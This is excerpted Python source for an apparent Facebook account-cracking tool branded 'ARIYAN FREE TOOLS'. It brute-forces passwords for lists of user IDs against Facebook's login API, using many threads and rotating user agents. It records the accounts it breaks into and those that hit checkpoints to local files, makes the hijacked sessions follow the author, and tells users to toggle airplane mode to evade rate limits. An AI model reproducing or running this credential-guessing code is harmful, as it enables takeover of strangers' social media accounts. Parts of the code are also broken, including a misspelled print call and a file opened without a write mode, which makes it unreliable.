	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cp +=1
				print( f'\r\x1b[1;91m[Ariyan-CP] {idf} * {pw}')
				...
				wrt =('%s - %s' % (idf,pw))
				ok.append(wrt)
				open('/sdcard/Raj-CP.txt','a').write('%s\n' % wrt)
				follow(ses,coki)
				break
...
def free(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	sys.stdout.write('\r %s[Ariyan] %s/%s  [OK] %s |  [CP]:%s  '%(bi,loop,len(id2),len(ok),cp)),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				rint( f'\r\x1b[1;92m [Successful-Raj] {idf} * {pw}')
				...
				coki=po.cookies.get_dict()
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\x1b[1;92m [Successful-Raj] {idf} * {pw}')
				wrt =('%s - %s' % (idf,pw))
				ok.append(wrt)
				open('/sdcard/Successful-Raj.txt','a').write('%s\n' % wrt)
				follow(ses,coki)
				break
...
.............. 01706200853 .............
\033[1;92m══════════════════════════════════════════════════
\33[1;32m𝔸𝕦𝕥𝕙𝕠𝕣   : ARIYAN SHUVO
\33[1;32m𝔽𝕒𝕔𝕖𝕓𝕠𝕠𝕜 : ❮« 𖤍    ⃝𝐀Riyan᭄ 聞 𖤍@() :)        
\33[1;32m𝔾𝕚𝕥𝕙𝕦𝕓   : ARIYAN 404
\33[1;32m𝕍𝕖𝕣𝕤𝕚𝕠𝕟  : 4.2.1
\033[1;92m══════════════════════════════════════════════════
\33[1;41m\33[1;37m▓░▒░▒▓░▒░▒▓░▒▓░▒▓█[ ARIYAN FREE TOOLS ]█▓▒░▓░▒░▒▓░▒▓░▒▓\33[0m
\033[1;92m══════════════════════════════════════════════════"""
class Main:
	def __init__(self):
		self.id = []
		...
		print("")
		print("\33[1;37m")
		print("\033[1;37mNote : \33[1;41m\33[1;37mApprovel Friend Request My Id\33[0m")
		print("══════════════════════════════════════════════════")
		print("══════════════════════════════════════════════════")
		print("\033[1;32m  |1| \33[1;37m REQUEST MY FACEBOOK ACCOUNT ")
		...
		if Baloch in ["", " "]:
			...
			os.system("xdg-open https://www.facebook.com/profile.php?id=100079143742521")
			print("══════════════════════════════════════════════════")
			time.sleep(3.0)
			print("\033[1;32m     You Not Request The Facebook Account again Request Please")
			print("══════════════════════════════════════════════════")
			input("\n\033[1;37m ACCOUNT NAME :  \033[1;37m")
			time.sleep(3.1)
			print("══════════════════════════════════════════════════")
			print("\033[1;32m THANKS FOR Request MY ACCOUNT ")
			time.sleep(3.0)
			os.system("clear")
		print(logo)
		print(" ══════════════════════════════════════════════════")
		...
		print(" \033[1;92m[2] CRACK PUBLICK ID")
		print(" \33[1;33m[3 INDIA ID CLONING")
		print(" \033[1;34m[4] BD RRANDOM-[OPEN]")
		print(" \33[1;38m[5] PK RANDOM-OPEN ")
		print("\033[1;39m [E] EXIT \n")
	...
	def old(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print(" \033[0;97m[+] Note: OK AC OPEN 70% JUST NOW")
...
"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[1;32m[Successful-RAJ]%s | %s\033[1;32m         "%(uid, pw))
				print ("\r \033[1;32m Congrats ")
				self.ok.append("%s|%s"%(uid, pw))
				open("Successful-Raj.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[1;32m[Raj Ok-Just Now] %s | %s\033[1;32m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("Raj Ok-Just Now").write(" %s | %s\n"%(uid, pw))
				break
			else:
				continue
	...
	def old2(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("     \033[0;97m   FREE MODE ACTIVATE")
				print("\n\033[0;97m [+] BRUTE HAS BEEN START")
				print(" \033[0;97m[+] Note: OK Ac Open 60% just now")
				print(" [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS")
				print("\033[0;97m══════════════════════════════════════════════════")
				print("\n")
				print("\033[1;37m")
...
"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
		...
		sys.stdout.write(
			"\r [+]>%s/[Ariyan]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			...
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[1;32m[Ariyan Ok-Just Now Login] %s | %s\033[0;32m         "%(uid, pw))
				print ("\r \033[1;32m Congrats ")
				self.ok.append("%s|%s"%(uid, pw))
				open("Ariyan Ok-Just Now Login","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[1;32m[Jast-Naw-login-Ariyan] %s | %s\033[1;32m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("Successful-Ariyan.txt","a").write(" %s | %s\n"%(uid, pw))
				break
			else:
				continue
